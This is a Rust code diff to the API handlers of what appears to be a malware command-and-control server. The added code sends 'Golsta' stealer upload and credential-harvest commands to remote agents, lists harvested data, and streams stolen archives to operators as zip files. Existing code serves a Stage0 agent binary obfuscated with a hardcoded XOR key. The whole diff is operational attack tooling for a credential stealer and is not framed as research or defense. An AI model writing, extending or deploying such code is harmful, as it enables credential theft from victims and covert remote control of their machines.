@@ -3,10 +3,13 @@
 //! HTTP request handlers for the team client API.
 
 use axum::{
+    body::Body,
     extract::{Path, State},
-    http::{HeaderMap, StatusCode},
+    http::{header, HeaderMap, HeaderValue, StatusCode},
+    response::Response,
     Json,
 };
+use futures::TryStreamExt;
 use std::sync::Arc;
 
 use super::models::*;
@@ -313,20 +316,121 @@ pub async fn harvest_credentials(
         return Err(StatusCode::UNAUTHORIZED);
     }
 
-    // TODO: Full implementation should coordinate with the main server's module system
-    // to upload stealer.enc and stealer.key before sending the harvest command.
-    // Currently sends __HARVEST__ directly which requires modules to be pre-deployed.
-    match state.send_command(id, "__HARVEST__".to_string()).await {
-        Ok(_) => Ok(Json(CommandResponse {
-            success: true,
-            message: "Harvest command sent".to_string(),
-            agent_id: id,
-        })),
-        Err(e) => Ok(Json(CommandResponse {
-            success: false,
-            message: e,
-            agent_id: id,
-        })),
+    let commands = match crate::golsta_harvest_commands() {
+        Ok(commands) => commands,
+        Err(e) => {
+            return Ok(Json(CommandResponse {
+                success: false,
+                message: e,
+                agent_id: id,
+            }))
+        }
+    };
+
+    for command in commands {
+        if let Err(e) = state.send_command(id, command).await {
+            return Ok(Json(CommandResponse {
+                success: false,
+                message: e,
+                agent_id: id,
+            }));
+        }
+    }
+
+    Ok(Json(CommandResponse {
+        success: true,
+        message: "Golsta upload and harvest commands sent".to_string(),
+        agent_id: id,
+    }))
+}
+
+pub async fn golsta_status(
+    State(state): State<Arc<ApiState>>,
+    headers: HeaderMap,
+) -> Result<Json<ApiResponse<GolstaHealth>>, StatusCode> {
+    require_token(&state, &headers).await?;
+    let client = state
+        .golsta
+        .as_ref()
+        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;
+    client
+        .health()
+        .await
+        .map(ApiResponse::success)
+        .map(Json)
+        .map_err(|error| {
+            tracing::warn!("Golsta status error: {}", error);
+            StatusCode::BAD_GATEWAY
+        })
+}
+
+pub async fn golsta_harvests(
+    State(state): State<Arc<ApiState>>,
+    headers: HeaderMap,
+) -> Result<Json<ApiResponse<GolstaHarvestList>>, StatusCode> {
+    require_token(&state, &headers).await?;
+    let client = state
+        .golsta
+        .as_ref()
+        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;
+    client
+        .harvests()
+        .await
+        .map(ApiResponse::success)
+        .map(Json)
+        .map_err(|error| {
+            tracing::warn!("Golsta harvest index error: {}", error);
+            StatusCode::BAD_GATEWAY
+        })
+}
+
+pub async fn download_golsta_archive(
+    State(state): State<Arc<ApiState>>,
+    headers: HeaderMap,
+    Path(id): Path<String>,
+) -> Result<Response, StatusCode> {
+    require_token(&state, &headers).await?;
+    let client = state
+        .golsta
+        .as_ref()
+        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;
+    let upstream = client.archive(&id).await.map_err(|error| {
+        tracing::warn!("Golsta archive error: {}", error);
+        StatusCode::BAD_GATEWAY
+    })?;
+    let content_length = upstream.content_length();
+    let stream = upstream.bytes_stream().map_err(std::io::Error::other);
+    let mut response = Response::new(Body::from_stream(stream));
+    response.headers_mut().insert(
+        header::CONTENT_TYPE,
+        HeaderValue::from_static("application/zip"),
+    );
+    response.headers_mut().insert(
+        header::CONTENT_DISPOSITION,
+        HeaderValue::from_static("attachment; filename=\"golsta-harvest.zip\""),
+    );
+    response.headers_mut().insert(
+        header::CACHE_CONTROL,
+        HeaderValue::from_static("private, no-store"),
+    );
+    response.headers_mut().insert(
+        header::X_CONTENT_TYPE_OPTIONS,
+        HeaderValue::from_static("nosniff"),
+    );
+    if let Some(length) = content_length {
+        if let Ok(value) = HeaderValue::from_str(&length.to_string()) {
+            response.headers_mut().insert(header::CONTENT_LENGTH, value);
+        }
+    }
+    Ok(response)
+}
+
+async fn require_token(state: &ApiState, headers: &HeaderMap) -> Result<(), StatusCode> {
+    let token = extract_token(headers).ok_or(StatusCode::UNAUTHORIZED)?;
+    if state.validate_token(&token).await {
+        Ok(())
+    } else {
+        Err(StatusCode::UNAUTHORIZED)
     }
 }
 
@@ -528,10 +632,10 @@ pub async fn server_status(State(state): State<Arc<ApiState>>) -> Json<ServerSta
 const AGENT_XOR_KEY: &[u8] = b"C2R2_STAGE0_AGENT_KEY_2026";
 
 /// Download the full agent (XOR encrypted) for Stage0
-/// 
+///
 /// Stage0 calls this endpoint to download the agent binary.
 /// The agent is XOR encrypted for basic obfuscation in transit.
-/// 
+///
 /// Response format:
 /// - First 4 bytes: XOR key length (little-endian u32)
 /// - Next N bytes: XOR key
@@ -540,20 +644,22 @@ const AGENT_XOR_KEY: &[u8] = b"C2R2_STAGE0_AGENT_KEY_2026";
 pub async fn download_stage0_agent() -> impl axum::response::IntoResponse {
     use axum::http::{header, StatusCode};
     use std::fs;
-    
+
     // Stage0 now executes agent as a process, so we serve the EXE directly
     // (not shellcode). Prioritize .exe over .bin
     let agent_paths = [
-        "dist/agent.exe",      // EXE version (preferred for process execution)
-        "agent.exe",           // EXE in current dir
-        "../dist/agent.exe",   // EXE relative
-        "modules/agent.exe",   // EXE in modules
-        "dist/agent.bin",      // Fallback to shellcode
+        "dist/agent.exe",    // EXE version (preferred for process execution)
+        "agent.exe",         // EXE in current dir
+        "../dist/agent.exe", // EXE relative
+        "modules/agent.exe", // EXE in modules
+        "dist/agent.bin",    // Fallback to shellcode
         "agent.bin",
     ];
-    
-    let agent_path = agent_paths.iter().find(|p| std::path::Path::new(p).exists());
-    
+
+    let agent_path = agent_paths
+        .iter()
+        .find(|p| std::path::Path::new(p).exists());
+
     let agent_bytes = match agent_path {
         Some(path) => match fs::read(path) {
             Ok(bytes) => bytes,
@@ -575,23 +681,23 @@ pub async fn download_stage0_agent() -> impl axum::response::IntoResponse {
             );
         }
     };
-    
+
     tracing::info!("Serving agent ({} bytes, XOR encrypted)", agent_bytes.len());
-    
+
     // XOR encrypt the agent
     let encrypted: Vec<u8> = agent_bytes
         .iter()
         .enumerate()
         .map(|(i, &byte)| byte ^ AGENT_XOR_KEY[i % AGENT_XOR_KEY.len()])
         .collect();
-    
+
     // Build response: key_len(4) + key + size(4) + encrypted_agent
     let mut response = Vec::with_capacity(4 + AGENT_XOR_KEY.len() + 4 + encrypted.len());
     response.extend_from_slice(&(AGENT_XOR_KEY.len() as u32).to_le_bytes());
     response.extend_from_slice(AGENT_XOR_KEY);
     response.extend_from_slice(&(encrypted.len() as u32).to_le_bytes());
     response.extend_from_slice(&encrypted);
-    
+
     (
         StatusCode::OK,
         [(header::CONTENT_TYPE, "application/octet-stream")],
